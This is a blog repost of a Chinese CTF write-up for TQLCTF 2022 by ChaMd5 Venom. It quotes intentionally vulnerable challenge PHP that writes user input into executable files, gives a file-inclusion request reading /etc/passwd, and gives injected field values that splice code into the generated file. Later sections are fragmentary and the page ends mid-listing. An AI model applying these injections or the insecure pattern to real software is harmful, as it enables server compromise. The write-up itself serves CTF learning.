@@ -1,0 +1,337 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TQLCTF WriteUp - ChaMd5 Venom | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TQLCTF WriteUp - ChaMd5 Venom">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/TQLCTF-WriteUp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="TQLCTF 2022 ChaMd5 Venom：PHP 无字母 RCE + 128 维 lattice + Nemu 调试器栈迁移。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="php-lfi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/TQLCTF-WriteUp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TQLCTF WriteUp - ChaMd5 Venom',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">TQLCTF WriteUp - ChaMd5 Venom</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="TQLCTF WriteUp - ChaMd5 Venom"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/27072.html">https://www.ctfiot.com/27072.html</a><br>ID: 27072</p>
+</blockquote>
+<p>Web</p>
+<p>Simple PHP</p>
+<p>注册登录，&#x2F;get_pic.php?image&#x3D;&#x2F;etc&#x2F;passwd存在 LFI</p>
+<?php
+//  index.php
+error_reporting(0);
+if(isset($_POST['user']) && isset($_POST['pass'])){
+ $hash_user = md5($_POST['user']);
+ $hash_pass = 'zsf'.md5($_POST['pass']);
+ if(isset($_POST['punctuation'])){
+  //filter
+  if (strlen($_POST['user']) > 6){
+   echo("<script>alert('Username is too long!');</script>");
+  }
+  elseif(strlen($_POST['website']) > 25){
+   echo("<script>alert('Website is too long!');</script>");
+  }
+  elseif(strlen($_POST['punctuation']) > 1000){
+   echo("<script>alert('Punctuation is too long!');</script>");
+  }
+  else{
+   if(preg_match('/[^w/()*<>]/', $_POST['user']) === 0){
+    if (preg_match('/[^w/*:.;()n<>]/', $_POST['website']) === 0){
+     $_POST['punctuation'] = preg_replace("/[a-z,A-Z,0-9>?]/","",$_POST['punctuation']);
+     $template = file_get_contents('./template.html');
+     $content = str_replace("__USER__", $_POST['user'], $template);
+     $content = str_replace("__PASS__", $hash_pass, $content);
+     $content = str_replace("__WEBSITE__", $_POST['website'], $content);
+     $content = str_replace("__PUNC__", $_POST['punctuation'], $content);
+     file_put_contents('sandbox/'.$hash_user.'.php', $content);
+     echo("<script>alert('Successed!');</script>");
+    }
+    else{
+     echo("<script>alert('Invalid chars in website!');</script>");
+    }
+   }
+   else{
+    echo("<script>alert('Invalid chars in username!');</script>");
+   }
+  }
+ }
+ else{
+  setcookie("user", $_POST['user'], time()+3600);
+  setcookie("pass", $hash_pass, time()+3600);
+  Header("Location:
+sandbox/$hash_user.php");
+ }
+}
+?>
+
+<!doctype html>
+<p><html lang="zh"></p>
+<head>
+ <meta charset="UTF-8">
+ <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Simple Linux</title>
+ <link rel="stylesheet" type="text/css" href="css/styles.css">
+ <!--[if IE]>
+  <script src="http://libs.baidu.com/html5shiv/3.7/html5shiv.min.js"></script>
+ <![endif]-->
+</head>
+
+<p> <br>  <br>   <br>    <label for="tab-1" class="tab">Sign In</label><br>    <label for="tab-2" class="tab">Sign Up</label><br>    <br>     <form action="index.php" method="post"><br>      <br>       <br>        <label for="user" class="label">Username</label><br>        <br>       <br>       <br>        <label for="pass" class="label">Password</label><br>        <br>       <br>       <!-- 
+        
+        <label for="check"> Keep me Signed in</label>
+        --><br>       <br>        <br>       <br>       <br>       <!-- 
+        [Forgot Password?](#forgot)
+        --><br>      <br>     </form><br>     <form action="index.php" method="post"><br>      <br>       <br>        <label for="user" class="label">Username</label><br>        <br>       <br>       <br>        <label for="pass" class="label">Password</label><br>        <br>       <br>       <br>        <label for="pass" class="label">Your Website</label><br>        <br>       <br>       <br>        <label for="pass" class="label">Your Punctuation</label><br>        <br>       <br>       <br>        <br>       <br>       <br>       <br>        <label for="tab-1">Already Member?</a><br>       <br>      <br>     </form>
+    
+   
+  
+ 
+ </p>
+</html>
+
+<p>&#x2F;&#x2F;  template.html <br> <a title="开始" id="start_btn"></a><br>    <br>      <br>        <li><br>  <?php
+   error_reporting(0);
+   $user = ((string)__USER__);
+   $pass = ((string)__PASS__);
+   
+   if(isset($_COOKIE['user']) && isset($_COOKIE['pass']) && $_COOKIE['user'] === $user && $_COOKIE['pass'] === $pass){
+    echo($_COOKIE['user']);
+   }
+   else{
+    die("<script>alert('Permission denied!');</script>");
+   }
+  ?><br>  </li><br>      <br>      <br>        <li>系统设置</li><br>        <li>使用指南 </li><br>        <li>关于我们</li><br>        <li>退出系统</li>
+      
+    
+  </p>
+<p><a href="#"><strong>PUNC</strong></a></p>
+<p>  <li class="desktop_icon" id="win5" path="https://image.baidu.com/"> <br>    图片<br>      <br>    <br>  </li><br>  <li class="desktop_icon" id="win6" path="http://www.4399.com/"> <br>    游戏<br>      <br>    <br>  </li><br>  <li class="desktop_icon" id="win10" path="../get_pic.php?image=img/haokangde.png"> <br>    好康的<br>      <br>    <br>  </li><br>  <li class="desktop_icon" id="win16" path="__WEBSITE__"> <br>    你的网站<br>      <br>    <br>  </li></p>
+<p>  <a href="#"></a><br>  <a href="#"></a> 
+  
+    
+  </p>
+</html>
+
+<?php
+//  get_pic.php
+error_reporting(0);
+$image = (string)$_GET['image'];
+echo '  ';
+
+分析index.php和template.html不难发现，代码逻辑是加载我们注册时的四个变量拼接写入文件 此时我们让
+
+user=1)/*注释掉后面多余的信息
+
+pass 是拼接md5 之后的值 没什么用
+
+website=*/;__PUNC__/*完成前面的注释并引入__PUNC__注释后面的信息
+
+由于 punctuation 的正则，这道题就变成了无字母数字RCE
+
+因此构造一个 payload, 即可 RCE
+
+最终得到 flag
+
+m 还是很小的 直接选择爆破
+
+直接打开是乱码，编码问题，用 vim 打开是正常的
+
+最后几个字符，就很明显了，维吉尼亚，找个无密钥揭秘的工具
+
+关注公众号https://mp.weixin.qq.com/s/eMqFQ-qEE1ROzjVDqj-B1Q, 改一下 html 源码，时间长点
+
+end
+
+招新小广告
+
+ChaMd5 Venom 招收大佬入圈
+
+新成立组IOT+工控+样本分析 长期招新
+
+欢迎联系admin@chamd5.org
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//  index.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;user&#x27;]) &amp;&amp; isset($_POST[&#x27;pass&#x27;]))&#123;</span><br><span class="line"> $hash_user = md5($_POST[&#x27;user&#x27;]);</span><br><span class="line"> $hash_pass = &#x27;zsf&#x27;.md5($_POST[&#x27;pass&#x27;]);</span><br><span class="line"> if(isset($_POST[&#x27;punctuation&#x27;]))&#123;</span><br><span class="line">  //filter</span><br><span class="line">  if (strlen($_POST[&#x27;user&#x27;]) &gt; 6)&#123;</span><br><span class="line">   echo(&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  elseif(strlen($_POST[&#x27;website&#x27;]) &gt; 25)&#123;</span><br><span class="line">   echo(&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  elseif(strlen($_POST[&#x27;punctuation&#x27;]) &gt; 1000)&#123;</span><br><span class="line">   echo(&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else&#123;</span><br><span class="line">   if(preg_match(&#x27;/[^w/()*&lt;&gt;]/&#x27;, $_POST[&#x27;user&#x27;]) === 0)&#123;</span><br><span class="line">    if (preg_match(&#x27;/[^w/*:.;()n&lt;&gt;]/&#x27;, $_POST[&#x27;website&#x27;]) === 0)&#123;</span><br><span class="line">     $_POST[&#x27;punctuation&#x27;] = preg_replace(&quot;/[a-z,A-Z,0-9&gt;?]/&quot;,&quot;&quot;,$_POST[&#x27;punctuation&#x27;]);</span><br><span class="line">     $template = file_get_contents(&#x27;./template.html&#x27;);</span><br><span class="line">     $content = str_replace(&quot;__USER__&quot;, $_POST[&#x27;user&#x27;], $template);</span><br><span class="line">     $content = str_replace(&quot;__PASS__&quot;, $hash_pass, $content);</span><br><span class="line">     $content = str_replace(&quot;__WEBSITE__&quot;, $_POST[&#x27;website&#x27;], $content);</span><br><span class="line">     $content = str_replace(&quot;__PUNC__&quot;, $_POST[&#x27;punctuation&#x27;], $content);</span><br><span class="line">     file_put_contents(&#x27;sandbox/&#x27;.$hash_user.&#x27;.php&#x27;, $content);</span><br><span class="line">     echo(&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">    echo(&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> 